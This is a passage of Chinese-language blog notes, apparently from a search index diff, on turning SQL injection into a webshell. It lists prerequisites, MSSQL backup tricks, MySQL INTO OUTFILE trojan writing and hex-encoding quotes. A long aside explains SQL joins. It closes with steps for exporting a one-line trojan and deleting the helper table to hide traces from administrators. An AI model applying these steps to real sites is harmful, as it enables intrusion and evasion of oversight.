+</ul>
+<h5 id="7、SQL注入漏洞拿WebShell"><a href="#7、SQL注入漏洞拿WebShell" class="headerlink" title="7、SQL注入漏洞拿WebShell"></a>7、SQL注入漏洞拿WebShell</h5><ol>
+<li>前提条件，具有足够权限，对写入木马的文件夹有写入权限，知道网站绝对路径</li>
+<li>对于MsSQL 注入漏洞网站可以通过log 备份、差异备份拿WebShell</li>
+<li>对于MySQL 注入漏洞的网站可以通过into outfile 函数(写入函数)将一句话木马写入，拿WebShell。 还有一个是into file 函数（读取函数）<ul>
+<li>要有file_priv权限</li>
+<li>知道文件绝对路径</li>
+<li>能使用union</li>
+<li>对web目录有读权限<br>注：若过滤了单引号，则可以将函数中的字符进行hex编码</li>
+</ul>
+</li>
+</ol>
+<p>into outfile 函数类似</p>
+<pre><code>4）利用phpmyadmin 将木马导出，拿WebShell
+
+5）利用连接拿WebShell</code></pre><h5 id="什么是外连接？"><a href="#什么是外连接？" class="headerlink" title="什么是外连接？"></a>什么是外连接？</h5><p>​        数据库有内连接、外连接来组合条件适用，外连接分为左连接和右连接。这里我们可以使用外连接来获取WebShell.</p>
+<ul>
+<li>内连接：指连接结果仅包含符合连接条件的行，参与连接的两个表都应该符合连接条件。</li>
+<li>外连接：连接结果不仅包含符合连接条件的行同时也包含自身不符合条件的行。包括左外连接、右外连接和全外连接。</li>
+</ul>
+<p>1、内连接</p>
+<p>​    内连接，即最常见的等值连接</p>
+<p>例:</p>
+<pre><code>SELECT * FROM TESTA,TESTBWHERE TESTA.A=TESTB.A</code></pre><p>2、外连接</p>
+<pre><code>外连接分为左外连接，右外连接和全外连接。
+
+左外连接 left outer join 或者 left join
+
+左外连接就是在等值连接的基础上加上主表中的未匹配数据</code></pre><p>例:</p>
+<pre><code>SELECT *FROM TESTA LEFT OUTER JOIN TESTB ON TESTA.A=TESTB.A </code></pre><p>拓展内容：</p>
+<pre><code>全外连接 full outer join 或者 full join
+
+全外连接是在等值连接的基础上将左表和右表的未匹配数据都加上。</code></pre><p>例：</p>
+<pre><code>SELECT * FROM TESTA FULL OUTER JOIN TESTBON TESTA.A=TESTB.A</code></pre><p>结果:外连接内容参考链接：<a href="https://zhidao.baidu.com/question/338244729.html" target="_blank" rel="noopener">https://zhidao.baidu.com/question/338244729.html</a></p>
+<p>大概思路：</p>
+<ol>
+<li>创建表</li>
+<li>将一句话写入刚创建的表中</li>
+<li>查询一句话所在表到文件，成功将一句话写入文件</li>
+<li>导出木马到某个路径下</li>
+<li>删除刚刚创建的表（这一步是为了清楚痕迹，在一定程度上可以预防我们被管理员发现）</li>
+</ol>
 ]]></content>
   </entry>
 </search>
